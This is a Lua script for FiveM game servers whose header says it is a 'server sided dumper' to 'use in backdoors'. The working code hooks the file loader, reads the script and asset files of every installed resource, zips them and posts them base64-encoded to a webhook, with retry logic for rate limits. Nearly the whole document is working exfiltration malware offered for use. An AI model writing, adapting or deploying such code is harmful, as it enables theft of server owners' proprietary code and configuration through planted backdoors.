--[[
     _____       _            _     
    |  _  |     | |          | |    
 ___| |/' |_   _| |  __ _ ___| |__  
/ __|  /| | | | | | / _` / __| '_ \ 
\__ \ |_/ / |_| | || (_| \__ \ | | |
|___/\___/ \__,_|_(_)__,_|___/_| |_|
                                    
    -- DONT CONTACT ME THIS IS A QUICK SERVER SIDED DUMPER USE IT IN BACKDOORS DO WHATEVER, LOGS MOST FILES IN A ZIP AND SENDS TO WEBHOOK
]]
local webhookURL = ''
local dontLog = false
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local _debug = false
local function debugprint(...)
    if not _debug then return end
    print(...)
end
local function base64encode(data)
    return ((data:gsub('.', function(x)
        local r,binary='',x:byte()
        for i=8,1,-1 do
            r=r..(binary % 2^i - binary % 2^(i-1) > 0 and '1' or '0')
        end
        return r
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if #x < 6 then return '' end
        local c=0
        for i=1,6 do
            c=c + (x:sub(i,i) == '1' and 2^(6-i) or 0)
        end
        return b:sub(c+1,c+1)
    end)..({ '', '==', '=' })[#data % 3 + 1])
end
function LogFile(resourceName, fileContent)
    if dontLog then
        print(resourceName, fileContent)
        return 
    end
    fileContent = fileContent or ''
    if fileContent == '' then return end
    local encodedContent = base64encode(fileContent)
    local boundary = "------------------------" .. tostring(math.random(1000000000, 9999999999))
    local body = ""
    body = body .. "--" .. boundary .. "\r\n"
    body = body .. 'Content-Disposition: form-data; name="file"; filename="' .. resourceName .. '"\r\n'
    body = body .. "Content-Type: application/octet-stream\r\n"
    body = body .. "Content-Transfer-Encoding: base64\r\n\r\n"
    body = body .. encodedContent .. "\r\n"
    body = body .. "--" .. boundary .. "--\r\n"
    local headers = {
        ["Content-Type"] = "multipart/form-data; boundary=" .. boundary,
        ["Content-Length"] = tostring(#body)
    }
    local function sendRequest()
        PerformHttpRequest(webhookURL, function(statusCode, response, responseHeaders)
            debugprint("Status: " .. statusCode)
            debugprint("Response: " .. response)
            if statusCode == 429 then
                local retryAfter = 5
                if responseHeaders then
                    local retryAfterHeader = responseHeaders["Retry-After"] or responseHeaders["retry-after"]
                    if retryAfterHeader then
                        retryAfter = tonumber(retryAfterHeader)
                        if retryAfter > 10 then
                            retryAfter = retryAfter / 1000
                        end
                    end
                end
                print(("Rate limited, retrying after %.2f seconds"):format(retryAfter))
                SetTimeout(math.ceil(retryAfter * 1000), function()
                    sendRequest()
                end)
            end
        end, "POST", body, headers)
    end
    sendRequest()
end
local lrf = LoadResourceFile
local allFilesContents = {}
local function toBytesLE(num, bytes)
    local t = {}
    for i = 1, bytes do
        t[i] = string.char(num % 256)
        num = math.floor(num / 256)
    end
    return table.concat(t)
end
local function crc32(data)
    local crc = 0xFFFFFFFF
    for i = 1, #data do
        local byte = data:byte(i)
        crc = crc ~ byte
        for _ = 1, 8 do
            local mask = -(crc & 1)
            crc = (crc >> 1) ~ (0xEDB88320 & mask)
        end
    end
    return ~crc & 0xFFFFFFFF
end
local function createZip(files)
    local localFileHeaders = {}
    local centralDirHeaders = {}
    local offset = 0

    for i, file in ipairs(files) do
        local filename = file.filename
        local data = file.data or ""
        local uncompressedSize = #data
        local compressedSize = uncompressedSize
        local crc32 = crc32(data)
        local localHeader = {}
        localHeader[#localHeader+1] = toBytesLE(0x04034b50, 4)
        localHeader[#localHeader+1] = toBytesLE(20, 2)
        localHeader[#localHeader+1] = toBytesLE(0, 2)
        localHeader[#localHeader+1] = toBytesLE(0, 2)
        localHeader[#localHeader+1] = toBytesLE(0, 2)
        localHeader[#localHeader+1] = toBytesLE(0, 2)
        localHeader[#localHeader+1] = toBytesLE(crc32, 4)
        localHeader[#localHeader+1] = toBytesLE(compressedSize, 4)
        localHeader[#localHeader+1] = toBytesLE(uncompressedSize, 4)
        localHeader[#localHeader+1] = toBytesLE(#filename, 2)
        localHeader[#localHeader+1] = toBytesLE(0, 2) 
        localHeader[#localHeader+1] = filename
        local localHeaderStr = table.concat(localHeader)
        local centralHeader = {}
        centralHeader[#centralHeader+1] = toBytesLE(0x02014b50, 4)
        centralHeader[#centralHeader+1] = toBytesLE(20, 2)
        centralHeader[#centralHeader+1] = toBytesLE(20, 2)
        centralHeader[#centralHeader+1] = toBytesLE(0, 2)
        centralHeader[#centralHeader+1] = toBytesLE(0, 2)
        centralHeader[#centralHeader+1] = toBytesLE(0, 2)
        centralHeader[#centralHeader+1] = toBytesLE(0, 2)
        centralHeader[#centralHeader+1] = toBytesLE(crc32, 4)
        centralHeader[#centralHeader+1] = toBytesLE(compressedSize, 4)
        centralHeader[#centralHeader+1] = toBytesLE(uncompressedSize, 4)
        centralHeader[#centralHeader+1] = toBytesLE(#filename, 2)
        centralHeader[#centralHeader+1] = toBytesLE(0, 2)
        centralHeader[#centralHeader+1] = toBytesLE(0, 2)
        centralHeader[#centralHeader+1] = toBytesLE(0, 2)
        centralHeader[#centralHeader+1] = toBytesLE(0, 2)
        centralHeader[#centralHeader+1] = toBytesLE(0, 4)
        centralHeader[#centralHeader+1] = toBytesLE(offset, 4)
        centralHeader[#centralHeader+1] = filename
        local centralHeaderStr = table.concat(centralHeader)
        table.insert(localFileHeaders, localHeaderStr)
        table.insert(localFileHeaders, data)
        table.insert(centralDirHeaders, centralHeaderStr)
        offset = offset + #localHeaderStr + #data
    end
    local centralDirSize = 0
    for _, v in ipairs(centralDirHeaders) do
        centralDirSize = centralDirSize + #v
    end
    local endOfCentralDir = {}
    endOfCentralDir[#endOfCentralDir+1] = toBytesLE(0x06054b50, 4)
    endOfCentralDir[#endOfCentralDir+1] = toBytesLE(0, 2)
    endOfCentralDir[#endOfCentralDir+1] = toBytesLE(0, 2)
    endOfCentralDir[#endOfCentralDir+1] = toBytesLE(#files, 2)
    endOfCentralDir[#endOfCentralDir+1] = toBytesLE(#files, 2)
    endOfCentralDir[#endOfCentralDir+1] = toBytesLE(centralDirSize, 4)
    endOfCentralDir[#endOfCentralDir+1] = toBytesLE(offset, 4)
    endOfCentralDir[#endOfCentralDir+1] = toBytesLE(0, 2)
    local endOfCentralDirStr = table.concat(endOfCentralDir)
    local zipData = table.concat(localFileHeaders) .. table.concat(centralDirHeaders) .. endOfCentralDirStr
    return zipData
end
LoadResourceFile = function(resourceName, fileName, ...)
    local content = lrf(resourceName, fileName, ...)
    allFilesContents[resourceName] = allFilesContents[resourceName] or {}
    allFilesContents[resourceName][fileName] = content
    return content
end
function DumpResource(resourceName, cb)
    local manifest_string = LoadResourceFile(resourceName, 'fxmanifest.lua')
    local include_keys = {
        fx_version = false,
        game = false,
        lua54 = false,
        author = false,
        description = false,
        version = false,
        shared_scripts = true,
        client_scripts = true,
        server_scripts = true,
        shared_script = true,
        client_script = true,
        server_script = true,
        files = true,
        file = true,
        ui_page = false,
        dependency = false,
    }
    local normalize_key = {
        shared_script = "shared_scripts",
        client_script = "client_scripts",
        server_script = "server_scripts",
        file = "files",
    }
    local function strip_quotes(str)
        return str:gsub("^['\"]", ""):gsub("['\"]$", "")
    end
    local collected = {}
    local current_key = nil
    for line in manifest_string:gmatch("[^\r\n]+") do
        line = line:match("^%s*(.-)%s*$")
        if line ~= "" then
            debugprint("DEBUG line: " .. line)
            local single_key, single_value = line:match("^([%w_]+)%s+['\"](.-)['\"]$")
            if single_key and include_keys[single_key] then
                local key = normalize_key[single_key] or single_key
                collected[key] = collected[key] or {}
                table.insert(collected[key], single_value)
                debugprint("DEBUG single line matched: " .. key .. " = " .. single_value)
            elseif line:match("^([%w_]+)%s*{") then
                local block_key = line:match("^([%w_]+)%s*{")
                local key = normalize_key[block_key] or block_key
                if include_keys[block_key] or include_keys[key] then
                    debugprint("DEBUG block start: " .. key)
                    current_key = key
                    collected[current_key] = collected[current_key] or {}
                else
                    current_key = nil
                end
            elseif line == "}" then
                debugprint("DEBUG block end for: " .. (current_key or "nil"))
                current_key = nil
            elseif current_key and line:match("^['\"].+['\"],?$") then
                local item = strip_quotes(line:gsub(",", ""))
                table.insert(collected[current_key], item)
                debugprint("DEBUG block item for " .. current_key .. ": " .. item)
            end
        end
    end
    local function normalize_keys(t)
        local mapping = {
            shared_script = "shared_scripts",
            shared_scripts = "shared_scripts",
            client_script = "client_scripts",
            client_scripts = "client_scripts",
            server_script = "server_scripts",
            server_scripts = "server_scripts",
            file = "files",
            files = "files"
        }
        local normalized = {}
        for key, value in pairs(t) do
            local new_key = mapping[key] or key
            if type(value) == "table" then
                normalized[new_key] = normalized[new_key] or {}
                for _, item in ipairs(value) do
                    table.insert(normalized[new_key], item)
                end
            else
                normalized[new_key] = value
            end
        end
        return normalized
    end
    collected = normalize_keys(collected)
    for _, files in pairs(collected) do
        for _, file in pairs(files) do
            Wait(10)
            local manifest_string = LoadResourceFile(resourceName, file)
        end
    end
    print('COMPLETED RESOURCE')
    cb(true)
end
local resources = {}
for i = 0, GetNumResources() - 1 do
    local resourceName = GetResourceByFindIndex(i)
    table.insert(resources, resourceName)
end
for _, resourceName in ipairs(resources) do
    print("Dumping resource:", resourceName)
    allFilesContents[resourceName] = {}
    local done = false
    DumpResource(resourceName, function(success)
        done = true
    end)
    while not done do
        Citizen.Wait(50)
    end
    print("Finished dumping:", resourceName)
    local filesForZip = {}
    local files = allFilesContents[resourceName]
    if files then
        for filename, content in pairs(files) do
            table.insert(filesForZip, {
                filename = filename,
                data = content or ""
            })
        end
    end
    local zipData = createZip(filesForZip)
    LogFile(resourceName .. ".zip", zipData)
    print("Sent zip for resource:", resourceName)
    print("Starting next resource...")
end
print("COMPLETED DUMP")
